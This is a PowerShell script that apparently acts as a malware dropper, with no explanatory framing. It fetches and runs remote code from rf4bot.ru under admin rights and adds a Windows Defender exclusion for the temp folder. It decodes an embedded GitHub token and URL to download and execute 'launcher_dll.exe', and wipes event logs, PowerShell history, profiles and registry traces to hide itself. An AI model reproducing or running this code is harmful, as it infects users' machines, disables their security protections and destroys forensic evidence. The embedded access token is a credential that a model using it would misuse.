function Test-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru)`""

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas"

        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Error: Failed to start with administrator privileges."
            Exit 1
        }
    }
}

try {
    $PSDefaultParameterValues['*:Verbose'] = $false
    $PSDefaultParameterValues['*:Debug'] = $false
    $VerbosePreference = 'SilentlyContinue'
    $DebugPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
    $InformationPreference = 'SilentlyContinue'
    
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    try {
        wevtutil clear-log "Windows PowerShell" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
    } catch {}
} catch {}

$global:hadErrors = $false

function Global:Write-Error {
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Message
    )
    $global:hadErrors = $true
    Microsoft.PowerShell.Utility\Write-Error $Message
}

Function Sync-LocalTime {
    param(
        [Parameter(Mandatory=$false)]
        [string]$NtpServer = "time.windows.com"
    )

    try {
        w32tm /config /manualpeerlist:"$NtpServer" /syncfromflags:MANUAL /update
    }
    catch {
        Write-Error "Error: Failed to configure time service. $($_.Exception.Message)"
    }

    try {
        Stop-Service w32time -ErrorAction Stop
        Start-Service w32time -ErrorAction Stop
    }
    catch {
        Write-Error "Error: Failed to restart time service. $($_.Exception.Message)"
    }

    try {
        w32tm /resync /force
    }
    catch {
        Write-Error "Error: Failed to force time resync. $($_.Exception.Message)"
    }
}

Function DefenderClean {
    try {
        Remove-MpPreference -ExclusionPath $env:TEMP -ErrorAction Ignore
    } catch {
    }
}

Function SecureCleanup {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::Clear()
    } catch {
    }
    
    try {
        $logsToClean = @(
            "Windows PowerShell",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-PowerShell/Analytic",
            "Microsoft-Windows-PowerShell/Debug",
            "Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational",
            "Microsoft-Windows-PowerShell/Admin",
            "PowerShellCore/Operational",
            "Microsoft-Windows-WinRM/Operational",
            "Microsoft-Windows-WMI-Activity/Operational"
        )
        
        foreach ($log in $logsToClean) {
            try {
                wevtutil clear-log "$log" 2>$null
                wevtutil set-log "$log" /enabled:false 2>$null
                wevtutil set-log "$log" /enabled:true 2>$null
            } catch {
            }
        }
        
        try {
            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
            Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
            Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
        } catch {}
        
        try {
            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1000 -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    Remove-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=$_.Id} -ErrorAction SilentlyContinue
                } catch {}
            }
        } catch {}
        
    } catch {
    }
    
    try {
        $pathsToClean = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Visual Studio Code Host_history.txt",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Windows PowerShell ISE Host_history.txt",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
            "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\*"
        )
        
        foreach ($path in $pathsToClean) {
            try {
                Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
            } catch {}
        }
        
        $dirsToClean = @(
            "$env:APPDATA\Microsoft\Windows\PowerShell",
            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
        )
        
        foreach ($dir in $dirsToClean) {
            try {
                Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
    } catch {
    }
    
    try {
        $tempPaths = @($env:TEMP, $env:TMP, "$env:USERPROFILE\AppData\Local\Temp", "$env:SystemRoot\Temp")
        
        foreach ($tempPath in $tempPaths) {
            if (Test-Path $tempPath) {
                Get-ChildItem -Path $tempPath -Filter "*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "*PowerShell*" -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
                Get-ChildItem -Path $tempPath -Filter "tmp*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        
    } catch {
    }
    
    try {
        $regPaths = @(
            "HKCU:\Software\Microsoft\PowerShell",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
        )
        
        foreach ($regPath in $regPaths) {
            try {
                Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
    } catch {
    }
    
    try {
        ipconfig /flushdns | Out-Null
        arp -d * 2>$null | Out-Null
        netsh winsock reset 2>$null | Out-Null
    } catch {
    }
    
    try {
        wevtutil clear-log "Windows PowerShell" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
        wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
        Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
    } catch {
    }
}

Clear-Host
Test-RunAsAdmin

try {
    wevtutil clear-log "Windows PowerShell" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
    wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
    Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
} catch {}

Sync-LocalTime -NtpServer "time.windows.com"
Clear-Host
function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
    } catch {
        Write-Error "Error: Failed to set registry value. $($_.Exception.Message)"
    }
}

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Error "Error: Failed to clear event logs. $($_.Exception.Message)"
}

$temp = $env:TEMP

$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try	{
	if (!$redistCheck)
	{
		$redistFilePath = "$temp\VC_redist.x64.exe"
		try
		{
			Remove-Item $redistFilePath -ErrorAction Ignore;
		}
		catch {
            Write-Error "Error: Failed to remove existing redistributable file. $($_.Exception.Message)"
        }
		try
		{
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to download VC++ redistributable. $($_.Exception.Message)"
		}
		try
		{
			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
			Remove-Item $redistFilePath -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to install VC++ redistributable. $($_.Exception.Message)"
		}
	}

    
	try { 
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            try {
                $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
                if ($defenderService -and $defenderService.Status -eq "Running") {
                    $preferences = Get-MpPreference -ErrorAction SilentlyContinue
                    if ($preferences) {
                        if ($preferences.DisableRealtimeMonitoring -eq $true) {
                            Write-Host "Windows Defender real-time protection is disabled" -ForegroundColor Yellow
                        }
                        try {
                            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
                            Write-Host "Successfully added exclusion to Windows Defender: $temp" -ForegroundColor Green
                        } catch {
                            if ($_.Exception.Message -like "*0x800106ba*" -or $_.Exception.Message -like "*tamper*" -or $_.Exception.Message -like "*policy*") {
                                Write-Host "Tamper Protection or Group Policy is blocking Windows Defender changes" -ForegroundColor Red
                            } else {
                                Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
                            }
                        }
                    } else {
                        Write-Host "Cannot get Windows Defender preferences - service may be disabled" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "Windows Defender service is not running" -ForegroundColor Yellow
                }
            } catch {
                Write-Error "Error: Failed to check Windows Defender status. $($_.Exception.Message)"
            }
        } else {
        }
    } catch {
        Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
    }
    try {
        Start-Process -FilePath "C:\Windows\system32\rundll32.exe" -ArgumentList "C:\Windows\system32\WININET.dll,DispatchAPICall 3" -NoNewWindow -Wait
    } catch {
        Write-Error "Error: Failed to execute rundll32 command. $($_.Exception.Message)"
    }
    $contFile = [System.IO.Path]::GetTempFileName()

    try {
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
        $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9sYXVuY2hlci9jb250ZW50cy9sYXVuY2hlcl9kbGwuZXhl"
        $Url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
		$h = @{
			"Authorization"  = "$String"
			"Cache-Control"  = "no-cache"
		}
        $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile
		

		
        if (Test-Path $contFile) {
			try {
				Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -NoNewWindow
				Exit 0
			} catch {
				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
				try {
					Remove-Item $contFile -Force -ErrorAction SilentlyContinue
				} catch {}
				Start-Sleep -s 3
			}
        } else {
            Write-Error "Error: Downloaded file does not exist at expected location."
            try {
                Remove-Item $contFile -Force -ErrorAction SilentlyContinue
            } catch {}
            Start-Sleep -s 3
        }
    } catch {
        Write-Error "Error: Failed to download or process the file. $($_.Exception.Message)"
        try {
            Remove-Item $contFile -Force -ErrorAction SilentlyContinue
        } catch {}
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
}

if ($global:hadErrors) {
    Write-Host "`nErrors were encountered during script execution." -ForegroundColor Red
    Write-Host "Console will automatically close in 5 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    Exit 1
}

DefenderClean
SecureCleanup 